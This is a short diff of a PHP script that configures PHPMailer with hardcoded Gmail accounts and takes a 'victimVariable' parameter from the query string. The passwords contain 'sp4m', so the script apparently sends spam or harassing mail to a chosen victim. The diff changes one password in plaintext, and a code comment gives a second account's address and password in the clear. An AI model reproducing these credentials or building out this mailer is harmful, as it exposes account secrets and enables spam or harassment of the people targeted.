@@ -8,7 +8,7 @@ header('Access-Control-Allow-Headers:Access-Control-Allow-Headers,Origin,Accept,
    
    require 'D:\composer\vendor\autoload.php';
    
-   $account = array("fearmypowergoodsiralt2@gmail.com", "sp4m.m3!alt"); //PC account, the pi zero account is "fearmypowergoodsiraltzero@gmail.com" and the password is "sp4m.m3!altzero"
+   $account = array("fearmypowergoodsiralt2@gmail.com", "sp4m.m3!alt2"); //PC account, the pi zero account is "fearmypowergoodsiraltzero@gmail.com" and the password is "sp4m.m3!altzero"
    $mail = new PHPMailer(true);
    
    $victimVariable = $_GET['victimVariable'];
